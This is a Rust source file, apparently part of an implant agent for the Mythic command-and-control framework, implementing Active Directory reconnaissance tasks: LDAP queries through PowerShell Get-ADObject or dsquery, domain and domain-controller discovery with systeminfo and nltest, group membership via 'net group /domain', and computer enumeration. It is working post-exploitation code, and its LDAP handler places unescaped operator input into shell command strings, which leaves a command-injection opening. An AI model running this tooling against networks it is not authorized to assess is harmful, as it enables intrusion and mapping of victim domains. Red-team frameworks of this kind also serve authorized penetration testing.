use crate::{AgentTask, mythic_error, mythic_success};
use serde::Deserialize;

#[cfg(target_os = "windows")]
use std::process::Command;

#[derive(Deserialize)]
struct LdapSearchArgs {
    filter: String,
    #[serde(default)]
    base_dn: Option<String>,
    #[serde(default)]
    attributes: Option<String>,
    #[serde(default)]
    server: Option<String>,
}

#[derive(Deserialize)]
struct DomainUsersArgs {
    group: String,
}

#[derive(Deserialize)]
struct DomainComputersArgs {
    filter: String,
}

pub fn ldap_search(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    #[cfg(not(target_os = "windows"))]
    return Ok(mythic_error!(task.id, "LDAP search is Windows only"));

    #[cfg(target_os = "windows")]
    {
        let args: LdapSearchArgs = serde_json::from_str(&task.parameters)?;

        let mut ps_cmd = format!("Get-ADObject -LDAPFilter '{}'", args.filter);

        if let Some(base) = args.base_dn {
            ps_cmd.push_str(&format!(" -SearchBase '{}'", base));
        }

        if let Some(attrs) = args.attributes {
            ps_cmd.push_str(&format!(" -Properties {}", attrs));
        }

        if let Some(srv) = args.server {
            ps_cmd.push_str(&format!(" -Server '{}'", srv));
        }

        ps_cmd.push_str(" | ConvertTo-Json");

        let output = Command::new("powershell")
            .arg("-NoProfile")
            .arg("-Command")
            .arg(&ps_cmd)
            .output()?;

        if output.status.success() {
            let stdout = String::from_utf8_lossy(&output.stdout);
            if stdout.contains("not recognized") || stdout.contains("Get-ADObject") {
                let fallback_cmd = format!("dsquery * -filter \"{}\" -limit 0", args.filter);
                let fallback_output = Command::new("cmd.exe")
                    .arg("/c")
                    .arg(&fallback_cmd)
                    .output()?;

                if fallback_output.status.success() {
                    let result = String::from_utf8_lossy(&fallback_output.stdout);
                    Ok(mythic_success!(task.id, result.to_string()))
                } else {
                    let err = String::from_utf8_lossy(&fallback_output.stderr);
                    Ok(mythic_error!(task.id, format!("dsquery error: {}", err)))
                }
            } else {
                Ok(mythic_success!(task.id, stdout.to_string()))
            }
        } else {
            let stderr = String::from_utf8_lossy(&output.stderr);
            Ok(mythic_error!(task.id, format!("PowerShell error: {}", stderr)))
        }
    }
}

pub fn domain_info(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    #[cfg(not(target_os = "windows"))]
    return Ok(mythic_error!(task.id, "Domain info is Windows only"));

    #[cfg(target_os = "windows")]
    {
        let ps_cmd = "[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() | Select-Object Name,Forest,DomainControllers,DomainModeLevel | ConvertTo-Json";

        let output = Command::new("powershell")
            .arg("-NoProfile")
            .arg("-Command")
            .arg(ps_cmd)
            .output()?;

        if output.status.success() {
            let stdout = String::from_utf8_lossy(&output.stdout);
            Ok(mythic_success!(task.id, stdout.to_string()))
        } else {
            let systeminfo = Command::new("systeminfo")
                .output()?;

            let nltest = Command::new("nltest")
                .arg("/dclist:")
                .output()?;

            let mut result = String::new();

            if systeminfo.status.success() {
                let info = String::from_utf8_lossy(&systeminfo.stdout);
                for line in info.lines() {
                    if line.starts_with("Domain") {
                        result.push_str(line);
                        result.push('\n');
                    }
                }
            }

            if nltest.status.success() {
                result.push_str("\nDomain Controllers:\n");
                result.push_str(&String::from_utf8_lossy(&nltest.stdout));
            }

            if result.is_empty() {
                let stderr = String::from_utf8_lossy(&output.stderr);
                Ok(mythic_error!(task.id, format!("Failed to get domain info: {}", stderr)))
            } else {
                Ok(mythic_success!(task.id, result))
            }
        }
    }
}

pub fn domain_users(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    #[cfg(not(target_os = "windows"))]
    return Ok(mythic_error!(task.id, "Domain users query is Windows only"));

    #[cfg(target_os = "windows")]
    {
        let args: DomainUsersArgs = serde_json::from_str(&task.parameters)?;

        let output = Command::new("net")
            .arg("group")
            .arg(&args.group)
            .arg("/domain")
            .output()?;

        if output.status.success() {
            let stdout = String::from_utf8_lossy(&output.stdout);
            Ok(mythic_success!(task.id, stdout.to_string()))
        } else {
            let stderr = String::from_utf8_lossy(&output.stderr);
            Ok(mythic_error!(task.id, format!("net group error: {}", stderr)))
        }
    }
}

pub fn domain_computers(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    #[cfg(not(target_os = "windows"))]
    return Ok(mythic_error!(task.id, "Domain computers query is Windows only"));

    #[cfg(target_os = "windows")]
    {
        let args: DomainComputersArgs = serde_json::from_str(&task.parameters)?;

        let output = match args.filter.as_str() {
            "all" => {
                Command::new("dsquery")
                    .arg("computer")
                    .arg("-limit")
                    .arg("0")
                    .output()?
            },
            "dcs" => {
                Command::new("nltest")
                    .arg("/dclist:")
                    .output()?
            },
            "servers" => {
                let dsquery = Command::new("dsquery")
                    .arg("computer")
                    .arg("-o")
                    .arg("rdn")
                    .arg("-limit")
                    .arg("0")
                    .output()?;

                if dsquery.status.success() {
                    let output_str = String::from_utf8_lossy(&dsquery.stdout);
                    let filtered: Vec<&str> = output_str
                        .lines()
                        .filter(|line| line.to_lowercase().contains("server"))
                        .collect();
                    let result = filtered.join("\n");
                    return Ok(mythic_success!(task.id, result));
                } else {
                    dsquery
                }
            },
            _ => {
                return Ok(mythic_error!(task.id, format!("Invalid filter '{}'. Use: all, dcs, or servers", args.filter)));
            }
        };

        if output.status.success() {
            let stdout = String::from_utf8_lossy(&output.stdout);
            Ok(mythic_success!(task.id, stdout.to_string()))
        } else {
            let stderr = String::from_utf8_lossy(&output.stderr);
            Ok(mythic_error!(task.id, format!("Command error: {}", stderr)))
        }
    }
}
